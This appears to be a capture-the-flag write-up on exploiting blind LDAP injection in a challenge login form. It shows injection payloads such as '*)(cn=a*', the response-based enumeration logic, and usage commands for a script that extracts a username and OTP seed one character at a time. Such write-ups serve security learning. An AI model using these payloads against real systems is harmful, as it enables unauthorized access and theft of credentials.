CTF's login page is vulnerable to Blind LDAP injection, specifically on the inputUsername parameter

The form takes in two parameters - a username, and a OTP

Our objective here was to:
1. First discover what the username is
2. Discover what the seed is from the OTP. This is based on a comment in the HTML specifying that the seed is stored in a LDAP attribute

We notice that the error message allows us to determine whether an attribute value exists or not
1. if we guess a incorrectly, the response will say "User <x> not found"
2. if we guess an attribute value correctly, then our message is blank, or will say, cannot login

The injection payload is: \*)(attribute=*

For example: 

Iteration 1:
*)(cn=a*  - this will result in a User <url encoded payload> not found" 
*)(cn=l*) - this will result in "cannot login"
 
Iteration 2:
*)(cn=la*) - this will result in User <url encoded payload> not found"
*)(cn=ld*) - this will result in cannot login
  
Our script here will iterate through a range (representing upper/lower/number characters), and examine the resulting response to determine the attribute value, 1 character/number at a time

To use:
./python3 blindLDAPInjector.py --sessionID <sessionID> -f <attribute file> -o <option number>
  
  where sessionID represents the phpsessionID value
  
  where attribute file represents a text file that contains a list of LDAP attributes
  cn.txt - ldap attributes representing where the username is probably stored
  common.txt - list of common ldap attributes
  
  where option number represents:
  1 - uppercase only
  2 - lowercase only
  3 - numbers only
  4 - lower and numbers
  5 - all three combined
  
  To find the username:
  ./python3 blindLDAPInjector.py --sessionID <sessionID> -f cn.txt -o 2
  
  To find the seed:
  ./python3 blindLDAPInjector.py --sessionID <sessionID> -f common.txt -o 3
 
 ![cn enum](images/cn-discovery.PNG?raw=true "Blind Injection - Enumeration of CN")

Loginscript.py 

-after logging in we get a message 
"User must be member of root or adm group and have a registered token to issue commands on this server"
-loginscript was created to make a call out to stoken to retrieve a pin and simplify the double encoding + pin on requests to try to test how to get to the next step
